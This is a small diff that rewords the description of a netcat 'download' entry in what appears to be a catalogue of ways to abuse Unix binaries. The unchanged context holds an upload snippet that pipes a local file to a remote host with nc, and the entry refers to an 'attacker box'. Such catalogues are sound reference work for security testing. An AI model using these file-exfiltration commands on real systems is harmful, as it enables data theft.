@@ -19,7 +19,7 @@ functions:
         LFILE=file_to_send
         nc $RHOST $RPORT < "$LFILE"
   download:
-    - description: Fetch remote file from a remote TCP port. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file.
+    - description: Fetch remote file sent to a local TCP port. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file.
       code: |
         LPORT=12345
         LFILE=file_to_save
